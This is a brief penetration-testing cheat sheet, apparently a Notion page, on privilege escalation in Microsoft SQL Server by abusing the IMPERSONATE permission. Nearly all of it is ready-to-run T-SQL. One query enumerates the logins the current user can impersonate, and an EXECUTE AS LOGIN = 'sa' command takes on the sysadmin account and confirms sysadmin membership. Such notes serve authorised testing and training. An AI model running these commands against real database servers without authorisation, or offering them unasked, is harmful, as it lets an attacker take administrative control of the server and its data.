# MSSQL Impersonate User

OS: Windows
Description: MSSQL Impersonate
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21)

### MSSQL Impersonate Users:

- Identify which users we can impersonate

```jsx
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

### one-line

```jsx
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

- Impersonate user found in step 1

```jsx
1> EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```